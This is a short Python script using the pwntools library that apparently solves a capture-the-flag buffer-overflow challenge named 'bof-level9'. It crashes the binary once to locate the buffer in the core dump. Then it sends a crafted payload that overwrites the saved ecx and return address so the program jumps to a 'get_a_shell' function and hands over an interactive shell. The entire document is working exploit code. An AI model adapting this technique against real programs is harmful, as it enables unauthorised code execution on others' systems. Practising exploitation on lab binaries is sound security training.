from pwn import *

# Set up vars
p = process("./bof-level9")
e = ELF("./bof-level9")
get_a_shell = e.symbols['get_a_shell']

# Send input to cause a seg fault by changing ecx to something not good.
prog_input = (p32(get_a_shell)) + (120 * '1') + (p32(get_a_shell))
p.sendline(prog_input)
p.wait()

# Parse core file to find buffer start address
c = Core('./core')
buff = c.stack.find(prog_input)
print(buff)

# Send buffer address + 4 as ecx, and buffer address as return address (get_a_shell)
p = process("./bof-level9")
prog_input = (p32(get_a_shell)) + (120 * '1') + (p32(buff+4))
p.sendline(prog_input)
p.interactive()
